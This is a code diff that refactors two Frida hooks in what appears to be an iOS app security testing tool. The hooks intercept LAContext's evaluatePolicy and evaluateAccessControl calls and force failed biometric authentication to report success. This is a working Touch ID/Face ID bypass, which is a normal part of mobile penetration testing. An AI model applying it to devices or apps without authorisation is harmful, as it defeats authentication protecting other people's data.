@@ -77,7 +77,7 @@ export namespace userinterface {
     //                             }
     //                         }];
 
-    const job1: IJob = {
+    const policyJob: IJob = {
       identifier: jobs.identifier(),
       invocations: [],
       type: "ios-biometrics-disable-evaluatePolicy",
@@ -85,57 +85,57 @@ export namespace userinterface {
 
     const lacontext1: InvocationListener = Interceptor.attach(
       ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
-        onEnter(args) {
+      onEnter(args) {
 
-          // localizedReason:
-          const reason = new ObjC.Object(args[3]);
+        // localizedReason:
+        const reason = new ObjC.Object(args[3]);
+        send(
+          c.blackBright(`[${policyJob.identifier}] `) + `Localized Reason for auth requirement (evaluatePolicy): ` +
+          c.green(reason.toString()),
+        );
+
+        // get the original block that should run on success for reply:
+        // and save that block as a callback, to run once we change the reply
+        // from the OS to a true
+        const originalBlock = new ObjC.Block(args[4]);
+        const savedReplyBlock = originalBlock.implementation;
+
+        originalBlock.implementation = (success, error) => {
           send(
-            c.blackBright(`[${job1.identifier}] `) + `Localized Reason for auth requirement (evaluatePolicy): ` +
-            c.green(reason.toString()),
+            c.blackBright(`[${policyJob.identifier}] `) + `OS authentication response: ` +
+            c.red(success),
           );
 
-          // get the original block that should run on success for reply:
-          // and save that block as a callback, to run once we change the reply
-          // from the OS to a true
-          const originalBlock = new ObjC.Block(args[4]);
-          const savedReplyBlock = originalBlock.implementation;
-
-          originalBlock.implementation = (success, error) => {
+          if (!success === true) {
             send(
-              c.blackBright(`[${job1.identifier}] `) + `OS authentication response: ` +
-              c.red(success),
+              c.blackBright(`[${policyJob.identifier}] `) +
+              c.greenBright("Marking OS response as True instead"),
             );
 
-            if (!success === true) {
-              send(
-                c.blackBright(`[${job1.identifier}] `) +
-                c.greenBright("Marking OS response as True instead"),
-              );
+            // Change the success response from the OS to true
+            success = true;
+            error = null;
+          }
 
-              // Change the success response from the OS to true
-              success = true;
-              error = null;
-            }
+          // and run the original block
+          savedReplyBlock(success, error);
 
-            // and run the original block
-            savedReplyBlock(success, error);
-
-            send(
-              c.blackBright(`[${job1.identifier}] `) +
-              c.green("Biometrics bypass hook complete (evaluatePolicy)"),
-            );
-          };
-        },
-      });
+          send(
+            c.blackBright(`[${policyJob.identifier}] `) +
+            c.green("Biometrics bypass hook complete (evaluatePolicy)"),
+          );
+        };
+      },
+    });
 
     // register the job
-    job1.invocations.push(lacontext1);
-    jobs.add(job1);
+    policyJob.invocations.push(lacontext1);
+    jobs.add(policyJob);
 
     // -- Sample Swift
     // https://gist.github.com/algrid/f3f03915f264f243b9d06e875ad198c8/raw/03998319903ad9d939f85bbcc94ce9c23042b82b/KeychainBio.swift
 
-    const job2: IJob = {
+    const accessControlJob: IJob = {
       identifier: jobs.identifier(),
       invocations: [],
       type: "ios-biometrics-disable-evaluateAccessControl",
@@ -143,51 +143,51 @@ export namespace userinterface {
 
     const lacontext2: InvocationListener = Interceptor.attach(
       ObjC.classes.LAContext["- evaluateAccessControl:operation:localizedReason:reply:"].implementation, {
-        onEnter(args) {
+      onEnter(args) {
 
-          // localizedReason:
-          const reason = new ObjC.Object(args[4]);
+        // localizedReason:
+        const reason = new ObjC.Object(args[4]);
+        send(
+          c.blackBright(`[${accessControlJob.identifier}] `) + `Localized Reason for auth requirement (evaluateAccessControl): ` +
+          c.green(reason.toString()),
+        );
+
+        // get the original block that should run on success for reply:
+        // and save that block as a callback, to run once we change the reply
+        // from the OS to a true
+        const originalBlock = new ObjC.Block(args[5]);
+        const savedReplyBlock = originalBlock.implementation;
+
+        originalBlock.implementation = (success, error) => {
           send(
-            c.blackBright(`[${job2.identifier}] `) + `Localized Reason for auth requirement (evaluateAccessControl): ` +
-            c.green(reason.toString()),
+            c.blackBright(`[${accessControlJob.identifier}] `) + `OS authentication response: ` +
+            c.red(success),
           );
 
-          // get the original block that should run on success for reply:
-          // and save that block as a callback, to run once we change the reply
-          // from the OS to a true
-          const originalBlock = new ObjC.Block(args[5]);
-          const savedReplyBlock = originalBlock.implementation;
-
-          originalBlock.implementation = (success, error) => {
+          if (!success === true) {
             send(
-              c.blackBright(`[${job2.identifier}] `) + `OS authentication response: ` +
-              c.red(success),
+              c.blackBright(`[${accessControlJob.identifier}] `) +
+              c.greenBright("Marking OS response as True instead"),
             );
 
-            if (!success === true) {
-              send(
-                c.blackBright(`[${job2.identifier}] `) +
-                c.greenBright("Marking OS response as True instead"),
-              );
+            // Change the success response from the OS to true
+            success = true;
+            error = null;
+          }
 
-              // Change the success response from the OS to true
-              success = true;
-              error = null;
-            }
+          // and run the original block
+          savedReplyBlock(success, error);
 
-            // and run the original block
-            savedReplyBlock(success, error);
-
-            send(
-              c.blackBright(`[${job2.identifier}] `) +
-              c.green("Biometrics bypass hook complete (evaluateAccessControl)"),
-            );
-          };
-        },
-      });
+          send(
+            c.blackBright(`[${accessControlJob.identifier}] `) +
+            c.green("Biometrics bypass hook complete (evaluateAccessControl)"),
+          );
+        };
+      },
+    });
 
     // register the job
-    job2.invocations.push(lacontext2);
-    jobs.add(job2);
+    accessControlJob.invocations.push(lacontext2);
+    jobs.add(accessControlJob);
   };
 }
